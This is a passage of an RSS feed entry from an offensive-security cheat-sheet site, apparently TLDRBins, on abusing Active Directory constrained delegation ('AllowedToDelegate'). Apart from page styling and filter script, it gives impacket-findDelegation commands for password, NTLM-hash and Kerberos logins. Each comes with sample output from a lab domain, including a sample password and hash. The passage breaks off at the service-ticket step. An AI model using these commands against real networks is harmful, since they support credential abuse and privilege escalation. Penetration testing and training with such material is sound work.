<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Silver Ticket on TLDRBins</title>
    <link>https://tldrbins.github.io/@silver-ticket/</link>
    <description>Recent content in Silver Ticket on TLDRBins</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <atom:link href="https://tldrbins.github.io/@silver-ticket/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>AllowedToDelegate</title>
      <link>https://tldrbins.github.io/allowedtodelegate/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
      <description>&lt;style&gt;&#xA;:root{&#xA;   &#xA;  --line:     var(--grey-lighten-4, #e6e6e6);&#xA;  --bg:       var(--grey-lighten-5, #f7f7f7);&#xA;  --fg:       var(--grey, #666);&#xA;  --hover-bg: var(--grey-lighten-4, #ececec);&#xA;  --active-bg: white;&#xA;  --active-fg: var(--primary, #6b46c1);&#xA;&#xA;  --dm-line:   var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-bg:     var(--darkmode-dark-grey-1, #1f1f1f);&#xA;  --dm-fg:     #a8a8a8;&#xA;  --dm-hover:  #ae81ff;&#xA;  --dm-active-bg: var(--darkmode-dark-grey-2, #2b2b2b);&#xA;  --dm-active-fg: #ae81ff;&#xA;}&#xA;&#xA; &#xA;.auth-wrapper {&#xA;  display: flex;&#xA;  justify-content: center;      &#xA;  width: 100%;&#xA;}&#xA;&#xA;.auth-frame {&#xA;  border: 1px solid var(--line);&#xA;  border-radius: 10px;&#xA;  overflow: hidden;&#xA;  width: 100%;&#xA;  max-width: 900px;             &#xA;  background: var(--line);&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid {&#xA;  display: grid;&#xA;  grid-template-columns: 1fr 1fr 1fr;&#xA;  grid-template-rows: auto 1fr 1fr;&#xA;  gap: 1px;                     &#xA;  background: transparent;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;}&#xA;&#xA; &#xA;.cell {&#xA;  background: var(--bg);&#xA;  min-height: 50px;&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  padding: 0;&#xA;  color: var(--fg);&#xA;  transition: background-color .12s ease, color .12s ease;&#xA;}&#xA;&#xA; &#xA;.title {&#xA;  grid-column: 1 / -1;&#xA;  font-weight: 700;&#xA;  font-size: 1.05rem;&#xA;  color: var(--grey-darken-2);&#xA;  background: var(--bg);&#xA;  padding: 10px;&#xA;  text-align: center;&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-ker {&#xA;  user-select: none;         &#xA;  pointer-events: none;      &#xA;}&#xA;&#xA; &#xA;.cell-all    { grid-row: 2 / 4; grid-column: 1; }&#xA;.cell-pw     { grid-row: 2; grid-column: 2; }&#xA;.cell-ntlm   { grid-row: 3; grid-column: 2; }&#xA;.cell-ker    { grid-row: 2; grid-column: 3; }&#xA;.cell-subs   { grid-row: 3; grid-column: 3; }&#xA;&#xA; &#xA;.btn {&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  background: transparent;&#xA;  border: none;&#xA;  cursor: pointer;&#xA;  font-weight: 700;&#xA;  font-size: 0.9rem;&#xA;  color: inherit;&#xA;  text-align: center;&#xA;  padding: 12px 8px;&#xA;  box-sizing: border-box;&#xA;}&#xA;&#xA; &#xA;.auth-grid .cell:hover:not(.has-subrow) {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);  &#xA;}&#xA;.auth-grid .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;.sub-row {&#xA;  display: flex;&#xA;  width: 100%;&#xA;  height: 100%;&#xA;  gap: 1px;&#xA;  box-sizing: border-box;&#xA;}&#xA;.sub-item {&#xA;  flex: 1;&#xA;  background: var(--bg);&#xA;  display: flex;&#xA;  align-items: center;&#xA;  justify-content: center;&#xA;  color: var(--fg);&#xA;  transition: background .12s ease, color .12s ease;&#xA;}&#xA;.sub-item .btn { width: 100%; height: 100%; }&#xA;&#xA;.sub-item:hover {&#xA;  background: var(--hover-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;.sub-item:has(.btn.active) {&#xA;  background: var(--active-bg);&#xA;  color: var(--active-fg);&#xA;}&#xA;&#xA; &#xA;body.dark-mode .auth-frame {&#xA;  border-color: var(--dm-line);&#xA;  background: var(--dm-line);&#xA;}&#xA;body.dark-mode .cell,&#xA;body.dark-mode .sub-item {&#xA;  background: var(--dm-bg);&#xA;  color: var(--dm-fg);&#xA;}&#xA;body.dark-mode .title {&#xA;  background: var(--dm-bg);&#xA;  color: #d5d5d5;&#xA;}&#xA;&#xA;body.dark-mode .cell:hover:not(.has-subrow) {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);  &#xA;}&#xA;body.dark-mode .cell:has(.btn.active):not(.has-subrow) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;body.dark-mode .sub-item:hover {&#xA;  background: var(--dm-hover);&#xA;  color: var(--dm-active-bg);&#xA;}&#xA;body.dark-mode .sub-item:has(.btn.active) {&#xA;  background: var(--dm-active-bg);&#xA;  color: var(--dm-active-fg);&#xA;}&#xA;&#xA; &#xA;.highlight.active-block pre {&#xA;  border: 1px solid var(--grey-lighten-3);&#xA;  border-radius: 0.2rem;&#xA;}&#xA;&#xA;.highlight.active-block.codeBlock pre:hover,&#xA;.highlight.active-block.codeBlock-start pre:hover,&#xA;.highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--secondary);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block pre {&#xA;  border-color: var(--grey-darken-4);&#xA;}&#xA;&#xA;body.dark-mode .highlight.active-block.codeBlock pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-start pre:hover,&#xA;body.dark-mode .highlight.active-block.codeBlock-end pre:hover {&#xA;  border-color: var(--grey-lighten-1);&#xA;}&#xA;&#xA; &#xA;@media (max-width: 768px) {&#xA;  .auth-grid {&#xA;    grid-template-columns: 1fr;&#xA;    grid-template-rows: auto repeat(5, auto);&#xA;  }&#xA;  .cell-all,&#xA;  .cell-pw,&#xA;  .cell-ntlm,&#xA;  .cell-ker,&#xA;  .cell-subs {&#xA;    grid-row: auto;&#xA;    grid-column: 1;&#xA;  }&#xA;  .sub-row { flex-direction: column; }&#xA;}&#xA;&lt;/style&gt;&#xA;&#xA;&lt;script&gt;&#xA;document.addEventListener(&#34;DOMContentLoaded&#34;, () =&gt; {&#xA;  const buttons = document.querySelectorAll(&#34;.auth-grid .btn&#34;);&#xA;  const filters = [&#34;password&#34;, &#34;ntlm&#34;, &#34;password-based-kerberos&#34;, &#34;ntlm-based-kerberos&#34;, &#34;ticket-based-kerberos&#34;];&#xA;&#xA;  const filterMap = {&#xA;    password: [&#34;password&#34;],&#xA;    ntlm: [&#34;ntlm&#34;],&#xA;    &#34;kerberos-password&#34;: [&#34;password-based-kerberos&#34;],&#xA;    &#34;kerberos-ntlm&#34;: [&#34;ntlm-based-kerberos&#34;],&#xA;    &#34;kerberos-ticket&#34;: [&#34;ticket-based-kerberos&#34;],&#xA;    all: filters,&#xA;  };&#xA;&#xA;  function filterBlocks(filter) {&#xA;    const targetClasses = filterMap[filter] || [];&#xA;    const authClasses = [&#xA;      &#34;password&#34;,&#xA;      &#34;ntlm&#34;,&#xA;      &#34;password-based-kerberos&#34;,&#xA;      &#34;ntlm-based-kerberos&#34;,&#xA;      &#34;ticket-based-kerberos&#34;,&#xA;    ];&#xA;    const blocks = [...document.querySelectorAll(&#34;.highlight&#34;)];&#xA;    const groups = [];&#xA;    let current = [];&#xA;&#xA;    &#xA;    blocks.forEach(block =&gt; {&#xA;      current.push(block);&#xA;      const isEnd = block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      const isStandalone = block.classList.contains(&#34;codeBlock-start&#34;) &amp;&amp; block.classList.contains(&#34;codeBlock-end&#34;);&#xA;      if (isEnd || isStandalone) {&#xA;        groups.push(current);&#xA;        current = [];&#xA;      }&#xA;    });&#xA;    if (current.length) groups.push(current);&#xA;&#xA;    &#xA;    groups.forEach(group =&gt; {&#xA;      const authBlocks = group.filter(b =&gt; authClasses.some(c =&gt; b.classList.contains(c)));&#xA;      if (!authBlocks.length) return; &#xA;&#xA;      &#xA;      if (filter === &#34;all&#34;) {&#xA;        authBlocks.forEach(b =&gt; {&#xA;          b.style.display = &#34;block&#34;;&#xA;          b.classList.remove(&#34;active-block&#34;);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      const matched = authBlocks.filter(b =&gt;&#xA;        targetClasses.some(tc =&gt; b.classList.contains(tc))&#xA;      );&#xA;&#xA;      if (matched.length &gt; 0) {&#xA;        &#xA;        authBlocks.forEach(b =&gt; {&#xA;          const visible = matched.includes(b);&#xA;          b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;          b.classList.toggle(&#34;active-block&#34;, visible);&#xA;        });&#xA;        return;&#xA;      }&#xA;&#xA;      &#xA;      let fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;password&#34;));&#xA;      if (fallback.length === 0) {&#xA;        fallback = authBlocks.filter(b =&gt; b.classList.contains(&#34;ntlm&#34;));&#xA;      }&#xA;&#xA;      &#xA;      authBlocks.forEach(b =&gt; {&#xA;        const visible = fallback.includes(b);&#xA;        b.style.display = visible ? &#34;block&#34; : &#34;none&#34;;&#xA;        b.classList.toggle(&#34;active-block&#34;, visible);&#xA;      });&#xA;    });&#xA;  }&#xA;&#xA;  function setActiveButton(btn) {&#xA;    buttons.forEach(b =&gt; b.classList.remove(&#34;active&#34;));&#xA;    btn.classList.add(&#34;active&#34;);&#xA;    const filter = btn.dataset.filter;&#xA;    localStorage.setItem(&#34;authFilter&#34;, filter);&#xA;    filterBlocks(filter);&#xA;  }&#xA;&#xA;  const saved = localStorage.getItem(&#34;authFilter&#34;);&#xA;  const initial = saved &amp;&amp; filterMap[saved] ? saved : &#34;all&#34;;&#xA;  const initBtn = [...buttons].find(b =&gt; b.dataset.filter === initial);&#xA;  initBtn ? setActiveButton(initBtn) : filterBlocks(&#34;all&#34;);&#xA;&#xA;  buttons.forEach(btn =&gt; btn.addEventListener(&#34;click&#34;, () =&gt; setActiveButton(btn)));&#xA;});&#xA;&lt;/script&gt;&#xA;&#xA;&lt;br&gt;&#xA;&#xA;&#xA;&lt;div class=&#34;auth-wrapper&#34;&gt;&#xA;  &lt;div class=&#34;auth-frame&#34;&gt;&#xA;    &lt;div class=&#34;auth-grid&#34;&gt;&#xA;      &lt;div class=&#34;cell title&#34;&gt;Authentication Method&lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-all&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;all&#34;&gt;ALL&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-pw&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;password&#34;&gt;PASSWORD&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ntlm&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;ntlm&#34;&gt;NTLM&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-ker&#34;&gt;&#xA;        &lt;button class=&#34;btn&#34; data-filter=&#34;kerberos&#34;&gt;KERBEROS&lt;/button&gt;&#xA;      &lt;/div&gt;&#xA;&#xA;      &lt;div class=&#34;cell cell-subs has-subrow&#34;&gt;&#xA;        &lt;div class=&#34;sub-row&#34;&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-password&#34;&gt;PASSWORD&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn&#34; data-filter=&#34;kerberos-ntlm&#34;&gt;NTLM&lt;/button&gt;&lt;/div&gt;&#xA;          &lt;div class=&#34;sub-item&#34;&gt;&lt;button class=&#34;btn active&#34; data-filter=&#34;kerberos-ticket&#34;&gt;TICKET&lt;/button&gt;&lt;/div&gt;&#xA;        &lt;/div&gt;&#xA;      &lt;/div&gt;&#xA;    &lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&#xA;&#xA;&lt;h3 id=&#34;forge-a-ticket&#34;&gt;Forge a Ticket&lt;/h3&gt;&#xA;&lt;p&gt;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34; &gt;Linux&lt;/button&gt;&#xA;&#xA;&lt;button data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab2&#34; &gt;Windows&lt;/button&gt;&#xA;&#xA;&lt;div class=&#34;tabcontent&#34; data-tabset=&#34;set1&#34; data-tabcontent=&#34;tab1&#34;&gt;&lt;h4 id=&#34;1-pre-check&#34;&gt;1. Pre-Check&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight password&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-findDelegation &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$:Password123!&amp;#39;&lt;/span&gt; -dc-ip 10.129.31.133&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-----------  -----------------------------------  ----------------------------------  -----------------------  ----------&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -dc-ip &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; impacket-findDelegation &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$&amp;#39;&lt;/span&gt; -hashes :655fefd062c233e273bb9f0566384474 -dc-ip 10.129.31.133&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-----------  -----------------------------------  ----------------------------------  -----------------------  ----------&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight password-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Password-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -k -dc-ip &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.intelligence.htb&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-findDelegation &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$:Password123!&amp;#39;&lt;/span&gt; -k -dc-ip 10.129.31.133&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting machine hostname&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-----------  -----------------------------------  ----------------------------------  -----------------------  ----------&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ntlm-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; NTLM-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -hashes :&amp;lt;HASH&amp;gt; -k -dc-ip &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.intelligence.htb&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-findDelegation &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$&amp;#39;&lt;/span&gt; -hashes :655fefd062c233e273bb9f0566384474 -k -dc-ip 10.129.31.133&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting machine hostname&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;[-] CCache file is not found. Skipping...&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-----------  -----------------------------------  ----------------------------------  -----------------------  ----------&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight ticket-based-kerberos&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;#&lt;/span&gt; Ticket-based Kerberos&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-findDelegation &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -k -no-pass -dc-ip &amp;lt;DC_IP&amp;gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight sample-code&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gp&#34;&gt;$&lt;/span&gt; sudo ntpdate -s &lt;span class=&#34;s1&#34;&gt;&amp;#39;dc.intelligence.htb&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; impacket-findDelegation &lt;span class=&#34;s1&#34;&gt;&amp;#39;intelligence.htb/svc_int$&amp;#39;&lt;/span&gt; -k -no-pass -dc-ip 10.129.31.133&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;&lt;/span&gt;&lt;span class=&#34;go&#34;&gt;[*] Getting machine hostname&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;AccountName  AccountType                          DelegationType                      DelegationRightsTo       SPN Exists &#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;-----------  -----------------------------------  ----------------------------------  -----------------------  ----------&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;go&#34;&gt;svc_int$     ms-DS-Group-Managed-Service-Account  Constrained w/ Protocol Transition  WWW/dc.intelligence.htb  No&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;2-get-a-service-ticket&#34;&gt;2. Get a Service 